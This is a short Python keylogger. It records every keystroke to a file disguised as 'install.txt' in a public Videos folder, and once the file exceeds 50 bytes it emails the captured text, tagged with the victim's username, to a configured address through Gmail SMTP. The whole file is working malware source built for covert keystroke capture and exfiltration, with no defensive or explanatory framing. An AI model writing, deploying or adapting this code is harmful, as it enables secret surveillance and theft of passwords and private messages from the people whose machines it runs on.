from pynput import keyboard
from multiprocessing import Queue
import smtplib, os, time, getpass
from config_variables import *

file ="C:/Users/Public/Videos/install.txt"

if not os.path.isfile(file):
    f = open(file, 'w')
    file.close()

last_time = 0
username = getpass.getuser()
file_info = os.stat(file)
file_size = file_info.st_size

def send(msg, subject):
    email_text = "\r\n".join([
      "From: " + SENDER_EMAIL,
      "To: "+ RECIEVER_EMAIL,
      "Subject: "+subject,
      "",
      msg
      ])
    
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.ehlo()
    server.starttls()
    server.login(SENDER_EMAIL, SENDER_PASSWORD)
    server.sendmail(SENDER_EMAIL, RECIEVER_EMAIL, email_text)
    server.quit()

def on_press(key):
    global last_time

    f = open(file, 'a')
    if time.time() - last_time > 1:
        f.write(' \n')
    try:
        f.write(key.char + '\n')        
    except AttributeError:
        if key == keyboard.Key.space:
            f.write('space\n')
    except TypeError:
        pass

    f.close()

    last_time = time.time()

if(file_size > 50):
    with open(file, 'r') as f:
        msg = f.read()
    send(msg, username)
    open(file, 'w').close()

with keyboard.Listener(
        on_press=on_press) as listener:
    listener.join()
